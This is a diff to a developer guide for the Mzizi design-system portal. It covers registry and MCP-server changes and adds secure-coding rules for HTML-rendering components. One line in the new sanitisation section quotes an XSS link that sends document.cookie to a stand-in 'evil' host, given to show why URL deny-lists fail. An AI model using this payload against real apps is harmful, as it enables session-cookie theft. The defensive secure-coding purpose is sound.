@@ -141,7 +141,7 @@ pnpm lint:fix         # ESLint with --fix
 pnpm typecheck        # TypeScript type checking (tsc --noEmit)
 pnpm test             # Run Vitest test suite once
 pnpm test:watch       # Vitest in watch mode
-pnpm registry:normalize # Rewrite registry.json in canonical form (571 items)
+pnpm registry:normalize # Rewrite registry.json in canonical form
 pnpm registry:verify  # Non-mutating check — fails CI if registry.json is not canonical
 pnpm tokens:sync      # Regenerate every N1 token artifact from the DB (§8.4.1)
 pnpm tokens:verify    # Non-mutating check — fails CI if any token artifact drifted
@@ -281,7 +281,7 @@ design-portal/
 │   ├── icons.ts                      # Re-export shim for @/lib/icons (lucide-react passthrough)
 │   ├── observability.ts              # Structured logging with [mzizi] prefix
 │   ├── metrics.ts                    # MCP/API usage tracking
-│   ├── mcp-server.ts                 # MCP server factory — `createMziziMcpServer(supabase)`
+│   ├── mcp-server.ts                 # MCP server factory — `createMziziMcpServer()` (registry-backed)
 │   ├── nav.ts                        # Shared nav data for header + sidebar (curated, not auto-gen)
 │   ├── harness/                      # Vendored: NyuchiHarness + useNyuchiHarness hook
 │   ├── resilience/                   # Vendored: section error boundary + retry fetch + fallback
@@ -344,7 +344,7 @@ design-portal/
 | `components`                                           | **A VIEW over `component_documents`, not a table.** It covers thirteen collections and filters to rows whose `kind` is null — the `documentation` collection also holds retired doc pages (`kind: doc_page` / `overview`), which must never be served as installable components. It listed only nine collections until the extraction, which is why `primitives` (228), `styling-libs` (16, all of N1), `documentation-engine` (4) and `accessibility-audit` were invisible to `/api/v1/ui/{name}` while remaining visible over MCP. **Component source is NOT here** — it is on disk under `components/registry/n<N>-<label>/` (§8.3), read only through `lib/registry-source.ts`. The `source_code` column survives the view definition but is null on every row, and nothing reads it: the disk-then-DB fallback that used to is deleted. |
 | `component_documents`                                  | **Document-route staging table** (the spine of the new lean MCP). One self-contained JSON document per component (`{ owner, sources, legacy, files, … }`) keyed by node collection (`n1_tokens … n10_documentation`). The MCP at `/mcp` reads exclusively from here; the portal's `/api/v1/*` routes read from `components` and `component_docs`. The two surfaces are intentionally separate but stay in lock-step via a read-across pattern — `component_documents.legacy` mirrors the row in `components` so downstream consumers can pivot without duplicate fetches.                                                                                                                                                                                                                                                                    |
 | `component_docs`                                       | Use cases, variants, a11y notes (per component) — served by `/api/v1/ui/{name}/docs`                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         |
-| `component_versions`                                   | Per-component version history — served by `/api/v1/ui/{name}/versions`                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       |
+| `component_versions`                                   | Per-component version history — served by `/api/v1/ui/{name}/versions`. **Carries no `source_code` column, deliberately.** It used to: the view projected each archived version's `sourceCode` key, `getComponentVersions` did `select("*")`, and the route served ~10 MB of component source publicly across 2,728 rows — stale, since `button` came back 3,637 characters against 3,921 on disk. Component source has one home and it is git (§8.3). Closed at both layers: the query names its columns and the view no longer has the column at all.                                                                                                                                                                                                                                                                                      |
 | `documentation_pages`                                  | **HISTORICAL — never write to it.** Long-form docs are now MDX in this repo (§15.17, final), so this table is neither the source nor the destination. The DB-driven renderers, the dynamic `[slug]` route, and the `get_documentation_page` MCP tool are all removed, and `/api/v1/docs/*` returns HTTP 410 — none of which this reversal asks back, because MDX pages are routes rather than an API surface. The table stays in Supabase as the historical source-of-record. Author `.mdx` under `app/`, not rows here.                                                                                                                                                                                                                                                                                                                     |
 | `changelog`                                            | Releases — `nodes_affected` (uncapped), `tools_added/modified/deprecated/removed`, `components_added/modified/deprecated/removed`, `linked_issues`, `released_at`. Served at `/api/v1/changelog` and `/api/v1/changelog/{version}`; rendered into `/changelog` (#107).                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       |
 | `ai_instructions`                                      | System prompts per target (mcp-server, claude, copilot)                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      |
@@ -374,13 +374,13 @@ Supabase (source of truth)
 
 git (source of truth for THE COMPONENT REGISTRY, end to end)
      │
-     ├── registry.json                                  — the authored manifest, 571 items:
+     ├── registry.json                                  — the authored manifest:
      │                                                     install contract + `meta`
      │                                                     (use cases, variants, sizes,
      │                                                      features, a11y, owner,
      │                                                      collection, hasDemo)
      │
-     └── components/registry/n<N>-<label>/<name>.<ext>  — 571 files, the components
+     └── components/registry/n<N>-<label>/<name>.<ext>  — the components themselves
          │
          └──► lib/registry.ts joins the two and is read by
               /api/v1/ui/{name}, app/mcp/route.ts, /source/[name],
@@ -733,7 +733,7 @@ Every component in `components/ui/` MUST have:
 ### 8.3 Adding a New Component
 
 **Component source lives on disk, in git.** Every component is a file under
-`components/registry/n<N>-<label>/<name>.<ext>` — 571 of them across N1–N11. Source is
+`components/registry/n<N>-<label>/<name>.<ext>`, across N1–N11. Source is
 _not_ authored in Supabase any more; see `docs/component-source-migration.md` for why.
 Everything _around_ a component still lives in `component_documents`: description,
 dependencies, `registryDependencies`, `files[]`, node, collection, owner, status, version
@@ -780,6 +780,52 @@ and `json` only, because those span the whole token system (semantic tokens, bra
 overrides, listing themes) rather than just the palette. The platform generators that used
 to live there carried their own hardcoded five-mineral colour map and were the reason the
 token node shipped a five-and-five palette against a seven-and-seven system.
+
+### 8.4.2 A component that renders HTML sanitises it — the caller is not the boundary
+
+Registry components are installed into **other people's apps**, so a component that writes
+a prop into the DOM is the last place anyone can enforce anything. Four shipped with no
+sanitising at all, and the security review that found them was only possible once source
+was on disk — nothing could open a component while it lived in a JSON column.
+
+The rules, each of them a defect that actually shipped:
+
+1. **Anything reaching `dangerouslySetInnerHTML` or `innerHTML` is sanitised in the
+   component**, through DOMPurify with an explicit `ALLOWED_TAGS` / `ALLOWED_ATTR`
+   allow-list and an `ALLOWED_URI_REGEXP`. `chapter-reader`, `nyuchi-media` and
+   `rich-text-editor` injected a `content` / `value` prop raw. A chapter body, an article
+   body and a controlled editor value are externally authored by construction — if the
+   consumer had written them, they would not need the component to render them.
+2. **A URL going into an `href` is scheme-checked against an allow-list**, never a
+   deny-list. `markdown-renderer` escaped the quote so its `href` attribute could not be
+   broken out of, and that is not enough: `javascript:` needs no quote and no parenthesis
+   —`[x](javascript:location='https://evil/'+document.cookie)`. A deny-list has to
+   anticipate `vbscript:`, `data:`, and whatever comes next.
+3. **A refused URL keeps its link text.** Dropping the whole link silently deletes
+   content; the href is the dangerous part, the text is not.
+4. **Escape on EVERY branch, not most of them.** `markdown-renderer` ran headings,
+   paragraphs, list items, blockquotes and code blocks through `escapeHtml` and table
+   cells through nothing. Partial escaping reads as escaping. When you add a branch that
+   emits HTML, the question is which existing branch you copied and whether you copied its
+   escaping too.
+5. **Never `href="javascript:..."`, even for something inert like `history.back()`.** Any
+   CSP without `unsafe-inline` blocks it, so the control renders and does nothing in
+   exactly the apps careful enough to have a CSP — and it announces to a screen reader as
+   a link with no destination. It is a `<button onClick>`.
+
+### 8.4.3 The manifest is an install contract — two ways it silently breaks
+
+Both of these leave every gate green (typecheck, lint, tests, build) while `npx shadcn add`
+fails in someone else's project, which is why `pnpm registry:validate` checks them:
+
+- **`registryDependencies` is a bare name ONLY for components that exist upstream at
+  ui.shadcn.com.** The CLI resolves a bare name against the default registry; anything
+  Mzizi-only needs the absolute `https://mzizi.dev/api/v1/ui/<name>` form. 85 entries
+  across 58 components were bare names for Mzizi-only components.
+- **Every npm package a component imports appears in its `dependencies`.** 22 did not.
+  A Deno specifier like `jsr:@supabase/...` is not an npm package and cannot go there at
+  all — a component that needs one is not installable via the CLI, and its description
+  should say so.
 
 ### 8.5 When Building a New Bundu Ecosystem App
 
@@ -1094,7 +1140,7 @@ The portal runs the **Mzizi MCP server** at `/mcp` via Streamable HTTP transport
 
 ### Setup
 
-The MCP server is a Next.js API route at `app/mcp/route.ts`, powered by `lib/mcp-server.ts` (`createMziziMcpServer(supabase)`).
+The MCP server is a Next.js API route at `app/mcp/route.ts`, powered by `lib/mcp-server.ts` (`createMziziMcpServer()` — it takes NO Supabase client; it reads `registry.json` + the files on disk).
 
 Configured in `.claude/settings.json`:
 
@@ -1111,18 +1157,24 @@ Configured in `.claude/settings.json`:
 
 **Endpoint:** `POST /mcp` (JSON-RPC), `GET /mcp` (SSE), `DELETE /mcp` (cleanup), `OPTIONS /mcp` (CORS preflight)
 
-### Auth model — @supabase/server with `auth: 'none'`
+### Auth model — there is nothing to authenticate to
 
-The route handler builds a per-request anon-scoped `SupabaseClient` via `createSupabaseContext` from `@supabase/server` with `auth: 'none'`. The resulting client is read-only under RLS — no service-role key in scope, no write APIs exposed. The factory in `lib/mcp-server.ts` just consumes that client.
+The MCP no longer reaches a database at all, so this section's old
+`createSupabaseContext(request, { auth: 'none' })` dance is gone with it. The factory
+reads `registry.json` and the component files on disk, both of which are in the deployed
+bundle:
 
 ```typescript
-const { data: ctx, error } = await createSupabaseContext(request, {
-  auth: "none",
-  cors: false, // CORS handled by the route's own headers
-  env: { url: SUPABASE_URL, publishableKeys: { default: SUPABASE_PUBLISHABLE_KEY } },
-})
-const server = await createMziziMcpServer(ctx.supabase)
+const server = await createMziziMcpServer()
 ```
+
+That is the point of the migration, not a simplification of it. An anon Supabase client
+was the narrowest credential available, but it was still a network hop to a store that
+could be unreachable, stale, or return a different answer than `/api/v1/ui/{name}` served
+from the same request. Reading the bundle makes the MCP and the HTTP API answer from one
+source by construction rather than by convention, and removes the class of bug where a
+component was visible over MCP and invisible over HTTP (which is exactly what happened to
+249 of them).
 
 ### Resources (read-only data)
 
@@ -1329,7 +1381,7 @@ When working on this codebase as an AI assistant:
 6. **Keep components self-contained** — each file is independently installable via the registry.
 7. **Preserve accessibility** — APCA 3.0 AAA contrast, the dense control scale with adequate hit area on touch surfaces (§8.2), Radix primitives for keyboard/screen reader behaviour.
 8. **Test API output** — after modifying a component, verify it serves correctly via `/api/v1/ui/[name]`.
-9. **Respect the helix** — primitives don't import page-level code. The frontend model is the Mzizi DNA double helix: nodes on two backbones (engineering + meaning) plus cross-cutting rungs (fundi, documentation, discovery) — no axes, no outliers (§6.2). This is distinct from the data architecture served at `/architecture` — never conflate the two.
+9. **Use the MCP server** — served at `/mcp` via `lib/mcp-server.ts` (`createMziziMcpServer()`); it reads `registry.json` + the component files on disk, NOT `component_documents` and not any database. The legacy relational MCP is retired; `design.nyuchi.com` is a 308 redirect to `mzizi.dev`.
 10. **All brand wordmarks lowercase** — `mzizi`, `mukoko`, `nyuchi`, `shamwari`, `bundu`, `nhimbe`.
 11. **This is the canonical design system** — changes here propagate to all bundu ecosystem apps.
 12. **Run tests before committing** — `pnpm test` must pass; add tests for new behaviour, especially around API routes.
